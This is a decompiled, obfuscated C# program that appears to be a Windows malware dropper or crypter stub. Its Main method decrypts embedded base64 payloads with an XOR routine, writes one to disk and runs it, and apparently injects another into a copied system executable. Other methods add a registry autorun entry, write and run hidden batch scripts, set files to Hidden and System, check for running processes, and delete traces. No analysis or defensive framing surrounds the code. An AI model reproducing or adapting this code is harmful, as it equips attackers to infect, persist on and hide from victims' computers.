using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsWithUI;
using cyber1;

internal sealed class hhhhhhhhhhhhhhhhhhhhhhhhhhfdddddddddddddd
{
	[NonSerialized]
	internal static GetString getString_0;

	static hhhhhhhhhhhhhhhhhhhhhhhhhhfdddddddddddddd()
	{
		Strings.CreateGetStringDelegate(typeof(hhhhhhhhhhhhhhhhhhhhhhhhhhfdddddddddddddd));
	}

	[STAThread]
	public static void Main()
	{
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		byte[] array = default(byte[]);
		object executablePath = default(object);
		string text10 = default(string);
		string text11 = default(string);
		string text12 = default(string);
		string text13 = default(string);
		byte[] array2 = default(byte[]);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		string text14 = default(string);
		try
		{
			int try0001_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						if (!UnhandledExceptionHandlerWithUI.AttachApp())
						{
							return;
						}
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0015;
					case 1224:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0015;
							case 3:
								goto IL_0029;
							case 4:
								goto IL_0042;
							case 5:
								goto IL_0056;
							case 6:
								goto IL_0063;
							case 7:
								goto IL_0077;
							case 8:
							case 9:
								goto IL_008b;
							case 10:
								goto IL_00b9;
							case 11:
								goto IL_00d2;
							case 12:
								goto IL_0100;
							case 13:
								goto IL_012e;
							case 14:
								goto IL_0134;
							case 15:
								goto IL_0153;
							case 16:
								goto IL_015d;
							case 17:
							case 18:
								goto IL_018b;
							case 19:
								goto IL_0194;
							case 20:
								goto IL_01c3;
							case 21:
								goto IL_01e3;
							case 22:
								goto IL_01f8;
							case 23:
								goto IL_0216;
							case 24:
								goto IL_021f;
							case 25:
								goto IL_0228;
							case 26:
								goto IL_0231;
							case 27:
							case 28:
							case 29:
								goto IL_023a;
							case 30:
								goto IL_0268;
							case 31:
								goto IL_0284;
							case 32:
								goto IL_0299;
							case 33:
								goto IL_02ba;
							case 34:
								goto IL_02c3;
							case 35:
								goto IL_02e6;
							case 36:
								goto IL_02f1;
							case 37:
								goto IL_0310;
							case 38:
								goto IL_031e;
							case 39:
								goto IL_034a;
							case 40:
								goto IL_036b;
							case 41:
								goto IL_0377;
							case 42:
								goto IL_0384;
							case 43:
								goto IL_0399;
							case 44:
								goto IL_03b7;
							case 45:
							case 46:
								goto IL_03c0;
							case 47:
								goto IL_03c9;
							case 48:
								goto IL_03d2;
							case 49:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 50:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_03c9:
						num = 47;
						dsadfasdfasfasffas();
						goto IL_03d2;
						IL_03d2:
						num = 48;
						skiksidelete();
						break;
						IL_0015:
						num = 2;
						text = getString_0(6776);
						goto IL_0029;
						IL_0029:
						num = 3;
						if (fffffffffffffffffffff(getString_0(6789)))
						{
							goto IL_0042;
						}
						goto IL_008b;
						IL_0042:
						num = 4;
						text2 = getString_0(2638);
						goto IL_0056;
						IL_0056:
						num = 5;
						Thread.Sleep(11001);
						goto IL_0063;
						IL_0063:
						num = 6;
						text3 = getString_0(2638);
						goto IL_0077;
						IL_0077:
						num = 7;
						text4 = getString_0(2638);
						goto IL_008b;
						IL_008b:
						num = 9;
						text5 = Environment.GetEnvironmentVariable(getString_0(6806)) + getString_0(6819);
						goto IL_00b9;
						IL_00b9:
						num = 10;
						text6 = Environment.ExpandEnvironmentVariables(getString_0(6824));
						goto IL_00d2;
						IL_00d2:
						num = 11;
						text7 = getString_0(2638) + Path.GetTempPath() + getString_0(2638);
						goto IL_0100;
						IL_0100:
						num = 12;
						text8 = Environment.GetEnvironmentVariable(getString_0(6849)) + getString_0(6858);
						goto IL_012e;
						IL_012e:
						num = 13;
						text9 = text9;
						goto IL_0134;
						IL_0134:
						num = 14;
						array = decrypt(Convert.FromBase64String(text9), getString_0(6867));
						goto IL_0153;
						IL_0153:
						num = 15;
						executablePath = Application.get_ExecutablePath();
						goto IL_015d;
						IL_015d:
						num = 16;
						Operators.ConditionalCompareObjectEqual(Operators.CompareObjectEqual(executablePath, (object)(text5 + getString_0(6876)), false), (object)false, false);
						goto IL_018b;
						IL_018b:
						num = 18;
						coaielemele();
						goto IL_0194;
						IL_0194:
						num = 19;
						if (Operators.ConditionalCompareObjectEqual(Operators.CompareObjectEqual(executablePath, (object)(text5 + getString_0(6876)), false), (object)false, false))
						{
							goto IL_01c3;
						}
						goto IL_023a;
						IL_01c3:
						num = 20;
						Directory.CreateDirectory(text5 + getString_0(6905));
						goto IL_01e3;
						IL_01e3:
						num = 21;
						text10 = getString_0(6922);
						goto IL_01f8;
						IL_01f8:
						num = 22;
						if (Operators.CompareString(text10, getString_0(6922), false) == 0)
						{
							goto IL_0216;
						}
						goto IL_023a;
						IL_0216:
						num = 23;
						gsdddddddddddddddddddddd5555555();
						goto IL_021f;
						IL_021f:
						num = 24;
						ttttttt346344444444444444();
						goto IL_0228;
						IL_0228:
						num = 25;
						fsdsbgvdsbsdgbsdfgsdfsfsdfsdf();
						goto IL_0231;
						IL_0231:
						num = 26;
						nimic();
						goto IL_023a;
						IL_023a:
						num = 29;
						text11 = Environment.GetEnvironmentVariable(getString_0(6849)) + getString_0(6943);
						goto IL_0268;
						IL_0268:
						num = 30;
						text12 = text5 + getString_0(7008);
						goto IL_0284;
						IL_0284:
						num = 31;
						text13 = getString_0(7025);
						goto IL_0299;
						IL_0299:
						num = 32;
						array2 = decrypt(Convert.FromBase64String(text13), getString_0(49813));
						goto IL_02ba;
						IL_02ba:
						num = 33;
						VBMath.Randomize();
						goto IL_02c3;
						IL_02c3:
						num = 34;
						Encoding.GetEncoding(1252).GetBytes(getString_0(7025));
						goto IL_02e6;
						IL_02e6:
						num = 35;
						File.Delete(text12);
						goto IL_02f1;
						IL_02f1:
						num = 36;
						File.Delete(text5 + getString_0(49842));
						goto IL_0310;
						IL_0310:
						num = 37;
						File.Copy(text11, text12, overwrite: true);
						goto IL_031e;
						IL_031e:
						num = 38;
						((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(text5 + getString_0(49871), array2, false);
						goto IL_034a;
						IL_034a:
						num = 39;
						processStartInfo = new ProcessStartInfo(text5 + getString_0(49871));
						goto IL_036b;
						IL_036b:
						num = 40;
						Process.Start(processStartInfo);
						goto IL_0377;
						IL_0377:
						num = 41;
						PE32.PhysicalEducation(array2, text12);
						goto IL_0384;
						IL_0384:
						num = 42;
						text14 = getString_0(49884);
						goto IL_0399;
						IL_0399:
						num = 43;
						if (Operators.CompareString(text14, getString_0(6922), false) == 0)
						{
							goto IL_03b7;
						}
						goto IL_03c0;
						IL_03b7:
						num = 44;
						persitence();
						goto IL_03c0;
						IL_03c0:
						num = 46;
						dsadasdas();
						goto IL_03c9;
						end_IL_0001_2:
						break;
					}
					num = 49;
					others();
					ProjectData.EndApp();
					break;
					end_IL_0001:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 1224;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_3:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception exception_)
		{
			string text15 = default(string);
			UnhandledExceptionHandler.EntryPointException(exception_, new object[22]
			{
				executablePath, array, text9, text6, text15, text, text14, text13, text12, text11,
				text5, text7, processStartInfo, text8, array2, text2, text3, text4, text10, num3,
				num2, num
			});
		}
	}

	public static void nimic()
	{
	}

	public static void others()
	{
	}

	private static bool IDSAOPA3OIAPROECESRUNINN62(string string_0)
	{
		Process[] processesByName = default(Process[]);
		Process[] array = default(Process[]);
		int num = default(int);
		bool flag = default(bool);
		Process process = default(Process);
		try
		{
			processesByName = Process.GetProcessesByName(getString_0(49905));
			array = processesByName;
			num = 0;
			if (0 >= array.Length)
			{
				return flag;
			}
			process = array[num];
			if (process == null)
			{
				return false;
			}
			return true;
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateException6(exception_, flag, processesByName, process, num, array, string_0);
			throw;
		}
	}

	public static void dsadfasdfasfasffas()
	{
		string text = default(string);
		string object_ = default(string);
		string object_2 = default(string);
		string object_3 = default(string);
		string tempPath = default(string);
		string text2 = default(string);
		string object_4 = default(string);
		string object_5 = default(string);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		try
		{
			text = getString_0(49884);
			if (Operators.CompareString(text, getString_0(6922), false) == 0)
			{
				object_ = getString_0(49910);
				if (!IDSAOPA3OIAPROECESRUNINN62(getString_0(49915)))
				{
					object_2 = getString_0(49928);
					object_3 = getString_0(49949);
					tempPath = Path.GetTempPath();
					text2 = Environment.GetEnvironmentVariable(getString_0(6806)) + getString_0(6819);
					object_4 = getString_0(49966);
					object_5 = Environment.GetEnvironmentVariable(getString_0(6849)) + getString_0(6858);
					processStartInfo = new ProcessStartInfo(text2 + getString_0(49987));
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
					Process.Start(processStartInfo);
				}
			}
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateException9(exception_, text, object_, object_3, object_4, object_2, text2, tempPath, processStartInfo, object_5);
			throw;
		}
	}

	public static void dsadasdas()
	{
		string tempPath = default(string);
		string object_ = default(string);
		string text = default(string);
		string text2 = default(string);
		string object_2 = default(string);
		string text3 = default(string);
		string object_3 = default(string);
		string text4 = default(string);
		try
		{
			Thread.Sleep(20001);
			tempPath = Path.GetTempPath();
			object_ = Environment.GetEnvironmentVariable(getString_0(6849)) + getString_0(6858);
			text = Environment.GetEnvironmentVariable(getString_0(6806)) + getString_0(6819);
			text2 = text + getString_0(50016);
			object_2 = getString_0(50045);
			text3 = getString_0(50062);
			object_3 = getString_0(50075);
			File.Delete(text2);
			File.Delete(text + getString_0(50092) + text3);
			File.Delete(text + getString_0(50109));
			if (!File.Exists(text2))
			{
				text4 = getString_0(50142);
				File.Delete(text + getString_0(50092) + text4);
			}
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateException8(exception_, object_3, text2, text3, object_2, text, tempPath, object_, text4);
			throw;
		}
	}

	private static bool fffffffffffffffffffff(string string_0)
	{
		Process[] processesByName = default(Process[]);
		Process[] array = default(Process[]);
		int num = default(int);
		bool flag = default(bool);
		Process process = default(Process);
		try
		{
			processesByName = Process.GetProcessesByName(getString_0(50155));
			array = processesByName;
			num = 0;
			if (0 >= array.Length)
			{
				return flag;
			}
			process = array[num];
			if (process == null)
			{
				return false;
			}
			return true;
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateException6(exception_, flag, processesByName, process, num, array, string_0);
			throw;
		}
	}

	public static void skiksidelete()
	{
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		FileAttributes fileAttributes = default(FileAttributes);
		string tempPath = default(string);
		string text2 = default(string);
		string object_ = default(string);
		string text3 = default(string);
		string object_2 = default(string);
		try
		{
			int try0001_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0009;
					case 374:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_0013;
							case 4:
								goto IL_0018;
							case 5:
								goto IL_002b;
							case 6:
								goto IL_0058;
							case 7:
								goto IL_0083;
							case 8:
								goto IL_0096;
							case 9:
								goto IL_00c2;
							case 10:
								goto IL_00ce;
							case 11:
								goto IL_00ed;
							case 12:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 13:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_00ed:
						num = 11;
						File.SetAttributes(text + getString_0(49987), fileAttributes);
						break;
						IL_0009:
						num = 2;
						tempPath = Path.GetTempPath();
						goto IL_0013;
						IL_0013:
						num = 3;
						fileAttributes = FileAttributes.Hidden | FileAttributes.System;
						goto IL_0018;
						IL_0018:
						num = 4;
						text2 = getString_0(50168);
						goto IL_002b;
						IL_002b:
						num = 5;
						object_ = Environment.GetEnvironmentVariable(getString_0(6849)) + getString_0(6858);
						goto IL_0058;
						IL_0058:
						num = 6;
						text3 = tempPath + getString_0(6819) + text2 + getString_0(50173);
						goto IL_0083;
						IL_0083:
						num = 7;
						object_2 = getString_0(50182);
						goto IL_0096;
						IL_0096:
						num = 8;
						text = Environment.GetEnvironmentVariable(getString_0(6806)) + getString_0(6819);
						goto IL_00c2;
						IL_00c2:
						num = 9;
						File.SetAttributes(text3, fileAttributes);
						goto IL_00ce;
						IL_00ce:
						num = 10;
						File.SetAttributes(text + getString_0(6876), fileAttributes);
						goto IL_00ed;
						end_IL_0001_2:
						break;
					}
					num = 12;
					File.SetAttributes(text + getString_0(6905), fileAttributes);
					break;
					end_IL_0001:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 374;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_3:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateException10(exception_, fileAttributes, text2, object_2, text, tempPath, text3, object_, num3, num2, num);
			throw;
		}
	}

	private static void gsdddddddddddddddddddddd5555555()
	{
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		string text10 = default(string);
		string text11 = default(string);
		string text12 = default(string);
		string text13 = default(string);
		string text14 = default(string);
		StreamWriter streamWriter = default(StreamWriter);
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		string text15 = default(string);
		string text16 = default(string);
		string text17 = default(string);
		string text18 = default(string);
		try
		{
			text = Environment.GetEnvironmentVariable(getString_0(6806)) + getString_0(6819);
			text2 = getString_0(50199);
			text3 = getString_0(50224) + text2;
			text4 = text3 + getString_0(50237);
			text5 = getString_0(50290);
			text6 = getString_0(50295);
			text7 = Environment.GetEnvironmentVariable(getString_0(6849)) + getString_0(6858);
			text8 = getString_0(50304);
			text9 = text6 + getString_0(50333);
			text10 = getString_0(50338);
			text11 = getString_0(2638) + Path.GetTempPath() + getString_0(2638);
			text12 = getString_0(50371);
			text13 = text10 + getString_0(50388);
			text14 = getString_0(50397);
			streamWriter = new StreamWriter(text + getString_0(6905) + text12);
			num = 387218;
			num2 = -42830835;
			num3 = 72273848;
			text15 = getString_0(50426);
			text16 = getString_0(50463);
			streamWriter.Write(Environment.NewLine);
			text17 = text16 + getString_0(50468);
			text18 = text14 + getString_0(50489);
			streamWriter.Write(text15 + text17 + text18 + getString_0(1838));
			streamWriter.Write(Environment.NewLine);
			streamWriter.Dispose();
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateExceptionN(exception_, new object[22]
			{
				text4, streamWriter, text18, text15, text9, text14, text12, text2, text8, text13,
				text6, text5, text16, text, text11, text10, text3, num2, num3, num,
				text7, text17
			});
			throw;
		}
	}

	public static void persitence()
	{
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string tempPath = default(string);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		try
		{
			int try0001_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0001_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0009;
					case 918:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_0013;
							case 4:
								goto IL_0040;
							case 5:
								goto IL_006d;
							case 6:
								goto IL_0080;
							case 7:
								goto IL_00a0;
							case 8:
								goto IL_00be;
							case 9:
								goto IL_00dc;
							case 10:
								goto IL_00eb;
							case 11:
								goto IL_00fb;
							case 12:
								goto IL_0114;
							case 13:
								goto IL_0128;
							case 14:
								goto IL_0137;
							case 15:
								goto IL_0147;
							case 16:
								goto IL_0160;
							case 17:
								goto IL_016f;
							case 18:
								goto IL_017f;
							case 19:
								goto IL_0198;
							case 20:
								goto IL_01a8;
							case 21:
								goto IL_01bd;
							case 22:
								goto IL_01cc;
							case 23:
								goto IL_01dc;
							case 24:
								goto IL_01f5;
							case 25:
								goto IL_0205;
							case 26:
								goto IL_0214;
							case 27:
								goto IL_0224;
							case 28:
								goto IL_0234;
							case 29:
								goto IL_0243;
							case 30:
								goto IL_0253;
							case 31:
								goto IL_026c;
							case 32:
								goto IL_027c;
							case 33:
								goto IL_0290;
							case 34:
								goto IL_029f;
							case 35:
								goto IL_02af;
							case 36:
								goto IL_02c4;
							case 37:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 38:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_02c4:
						num = 36;
						streamWriter.Write(getString_0(3468));
						break;
						IL_0009:
						num = 2;
						tempPath = Path.GetTempPath();
						goto IL_0013;
						IL_0013:
						num = 3;
						text = Environment.GetEnvironmentVariable(getString_0(6849)) + getString_0(6858);
						goto IL_0040;
						IL_0040:
						num = 4;
						text2 = Environment.GetEnvironmentVariable(getString_0(6806)) + getString_0(6819);
						goto IL_006d;
						IL_006d:
						num = 5;
						text3 = getString_0(50502);
						goto IL_0080;
						IL_0080:
						num = 6;
						streamWriter = new StreamWriter(text2 + getString_0(49987), append: false);
						goto IL_00a0;
						IL_00a0:
						num = 7;
						streamWriter.Write(text3 + getString_0(50511));
						goto IL_00be;
						IL_00be:
						num = 8;
						File.Delete(text2 + getString_0(49987));
						goto IL_00dc;
						IL_00dc:
						num = 9;
						streamWriter.Write(Environment.NewLine);
						goto IL_00eb;
						IL_00eb:
						num = 10;
						Conversion.Int((object)false);
						goto IL_00fb;
						IL_00fb:
						num = 11;
						streamWriter.Write(getString_0(50516));
						goto IL_0114;
						IL_0114:
						num = 12;
						text4 = getString_0(50537);
						goto IL_0128;
						IL_0128:
						num = 13;
						streamWriter.Write(Environment.NewLine);
						goto IL_0137;
						IL_0137:
						num = 14;
						Conversion.Int((object)false);
						goto IL_0147;
						IL_0147:
						num = 15;
						streamWriter.Write(getString_0(50638));
						goto IL_0160;
						IL_0160:
						num = 16;
						streamWriter.Write(Environment.NewLine);
						goto IL_016f;
						IL_016f:
						num = 17;
						Conversion.Int((object)false);
						goto IL_017f;
						IL_017f:
						num = 18;
						streamWriter.Write(getString_0(50747));
						goto IL_0198;
						IL_0198:
						num = 19;
						Conversion.Int((object)false);
						goto IL_01a8;
						IL_01a8:
						num = 20;
						text5 = getString_0(50764);
						goto IL_01bd;
						IL_01bd:
						num = 21;
						streamWriter.Write(Environment.NewLine);
						goto IL_01cc;
						IL_01cc:
						num = 22;
						Conversion.Int((object)false);
						goto IL_01dc;
						IL_01dc:
						num = 23;
						streamWriter.Write(getString_0(50869));
						goto IL_01f5;
						IL_01f5:
						num = 24;
						Conversion.Int((object)false);
						goto IL_0205;
						IL_0205:
						num = 25;
						streamWriter.Write(Environment.NewLine);
						goto IL_0214;
						IL_0214:
						num = 26;
						Conversion.Int((object)false);
						goto IL_0224;
						IL_0224:
						num = 27;
						Conversion.Int((object)false);
						goto IL_0234;
						IL_0234:
						num = 28;
						streamWriter.Write(Environment.NewLine);
						goto IL_0243;
						IL_0243:
						num = 29;
						Conversion.Int((object)false);
						goto IL_0253;
						IL_0253:
						num = 30;
						streamWriter.Write(getString_0(50747));
						goto IL_026c;
						IL_026c:
						num = 31;
						Conversion.Int((object)false);
						goto IL_027c;
						IL_027c:
						num = 32;
						text6 = getString_0(50878);
						goto IL_0290;
						IL_0290:
						num = 33;
						streamWriter.Write(Environment.NewLine);
						goto IL_029f;
						IL_029f:
						num = 34;
						Conversion.Int((object)false);
						goto IL_02af;
						IL_02af:
						num = 35;
						text7 = getString_0(50951);
						goto IL_02c4;
						end_IL_0001_2:
						break;
					}
					num = 37;
					streamWriter.Dispose();
					break;
					end_IL_0001:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0001_dispatch = 918;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0001_3:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateExceptionN(exception_, new object[12]
			{
				text3, streamWriter, text4, text6, text5, text7, text2, tempPath, text, num3,
				num2, num
			});
			throw;
		}
	}

	public static void fsdsbgvdsbsdgbsdfgsdfsfsdfsdf()
	{
		string tempPath = default(string);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		StreamWriter streamWriter = default(StreamWriter);
		string text9 = default(string);
		string text10 = default(string);
		string text11 = default(string);
		string text12 = default(string);
		try
		{
			tempPath = Path.GetTempPath();
			text = getString_0(51064);
			text2 = Environment.GetEnvironmentVariable(getString_0(6806)) + getString_0(6819);
			text3 = getString_0(51077);
			text4 = getString_0(51094);
			text5 = Environment.GetEnvironmentVariable(getString_0(6849)) + getString_0(6858);
			text6 = getString_0(51111);
			text7 = getString_0(51128);
			text8 = text2 + getString_0(51153);
			streamWriter = new StreamWriter(text8);
			text9 = getString_0(51182);
			text10 = getString_0(51199);
			streamWriter.Write(getString_0(51216));
			streamWriter.Dispose();
			Interaction.Shell(text8, (AppWinStyle)0, false, -1);
			text11 = getString_0(51111);
			text12 = getString_0(51317);
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateExceptionN(exception_, new object[14]
			{
				text3, text, text6, text11, text8, text4, text7, text12, streamWriter, text2,
				tempPath, text9, text10, text5
			});
			throw;
		}
	}

	private static void ttttttt346344444444444444()
	{
		string text = default(string);
		string text2 = default(string);
		string tempPath = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string executablePath = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		string text8 = default(string);
		string text9 = default(string);
		string text10 = default(string);
		StreamWriter streamWriter = default(StreamWriter);
		string text11 = default(string);
		string text12 = default(string);
		string text13 = default(string);
		try
		{
			text = getString_0(2638);
			text2 = getString_0(2638);
			tempPath = Path.GetTempPath();
			text3 = getString_0(2638);
			text4 = getString_0(51334);
			executablePath = Application.get_ExecutablePath();
			text5 = Environment.GetEnvironmentVariable(getString_0(6849)) + getString_0(6858);
			text6 = getString_0(51367);
			text7 = Environment.GetEnvironmentVariable(getString_0(6806)) + getString_0(6819);
			text8 = getString_0(51412);
			text9 = text7 + getString_0(51437);
			text10 = getString_0(2638);
			streamWriter = new StreamWriter(text9);
			text11 = getString_0(51466);
			Conversion.Int((object)false);
			streamWriter.Write(getString_0(51511) + text11 + getString_0(51560));
			Conversion.Int((object)false);
			FileSystem.FileCopy(executablePath, text7 + getString_0(50109));
			text12 = getString_0(51577);
			text13 = getString_0(51610);
			streamWriter.Dispose();
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateExceptionN(exception_, new object[16]
			{
				text, text3, text2, text11, text6, text13, text12, text4, text10, executablePath,
				text8, text7, tempPath, streamWriter, text9, text5
			});
			throw;
		}
	}

	private static bool iskktrunn(string string_0)
	{
		Process[] processesByName = default(Process[]);
		Process[] array = default(Process[]);
		int num = default(int);
		bool flag = default(bool);
		Process process = default(Process);
		try
		{
			processesByName = Process.GetProcessesByName(getString_0(51655));
			array = processesByName;
			num = 0;
			if (0 >= array.Length)
			{
				return flag;
			}
			process = array[num];
			if (process == null)
			{
				return false;
			}
			return true;
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateException6(exception_, flag, processesByName, process, num, array, string_0);
			throw;
		}
	}

	public static byte[] decrypt(byte[] byte_0, string string_0)
	{
		checked
		{
			byte[] bytes = default(byte[]);
			int num = default(int);
			byte[] array = default(byte[]);
			int num2 = default(int);
			int i = default(int);
			int num3 = default(int);
			try
			{
				bytes = Encoding.Default.GetBytes(string_0);
				num = byte_0[byte_0.Length - 1] ^ 0x70;
				array = new byte[byte_0.Length + 1];
				num2 = byte_0.Length - 1;
				for (i = 0; i <= num2; i++)
				{
					array[i] = (byte)(byte_0[i] ^ num ^ bytes[num3]);
					num3 = ((num3 != string_0.Length - 1) ? (num3 + 1) : 0);
				}
				array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[byte_0.Length - 2 + 1]);
				return array;
			}
			catch (Exception exception_)
			{
				byte[] object_ = default(byte[]);
				StackFrameHelper.CreateException9(exception_, object_, num3, bytes, array, num, i, num2, byte_0, string_0);
				throw;
			}
		}
	}

	public static void coaielemele()
	{
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string tempPath = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		RegistryKey currentUser = default(RegistryKey);
		string text8 = default(string);
		string text9 = default(string);
		RegistryKey registryKey = default(RegistryKey);
		string environmentVariable = default(string);
		string text10 = default(string);
		try
		{
			text = getString_0(51668);
			text2 = getString_0(6922);
			text3 = Environment.GetEnvironmentVariable(getString_0(6806)) + getString_0(6819);
			if (Operators.CompareString(text2, getString_0(6922), false) == 0)
			{
				text4 = getString_0(51681);
				tempPath = Path.GetTempPath();
				text5 = getString_0(51710);
				text6 = getString_0(51739);
				text7 = getString_0(2638) + Environment.GetEnvironmentVariable(getString_0(6849)) + getString_0(6858);
				currentUser = Registry.CurrentUser;
				text8 = getString_0(51756);
				text9 = getString_0(51797);
				registryKey = currentUser.OpenSubKey(getString_0(51806) + text8 + getString_0(51819), writable: true);
				registryKey.SetValue(getString_0(51840), text3 + getString_0(6876));
				environmentVariable = Environment.GetEnvironmentVariable(getString_0(6849));
				text10 = text9 + getString_0(51849);
				if (!iskktrunn(text10))
				{
					Interaction.Shell(environmentVariable + getString_0(6819) + text10, (AppWinStyle)2, false, -1);
				}
			}
		}
		catch (Exception exception_)
		{
			StackFrameHelper.CreateExceptionN(exception_, new object[14]
			{
				text2, text, text3, text8, registryKey, text6, text9, environmentVariable, text10, text5,
				text4, currentUser, tempPath, text7
			});
			throw;
		}
	}
}
